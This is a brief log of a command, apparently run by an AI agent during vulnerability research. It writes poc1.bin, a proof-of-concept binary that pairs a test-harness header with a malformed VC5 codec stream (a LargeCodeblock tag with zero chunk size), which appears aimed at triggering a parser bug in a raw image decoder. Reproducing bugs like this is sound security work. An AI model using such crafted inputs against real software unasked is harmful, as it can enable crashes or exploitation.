Running command: cd /workspace && python3 - <<'PY'
import struct
p=bytearray()
# harness header little endian: raw image width,height,type,cpp,isCFA, whitePoint, tile offsets/dims
p += struct.pack('<IIIII', 2, 2, 0, 1, 1)
p += struct.pack('<i', 4095)
p += struct.pack('<IIII', 0, 0, 2, 2)
# VC5 stream big endian magic then LargeCodeblock tag with zero chunk size
p += struct.pack('>IHH', 0x56432d35, 0x6000, 0)
open('/workspace/poc1.bin','wb').write(p)
print(len(p), p.hex())
PY
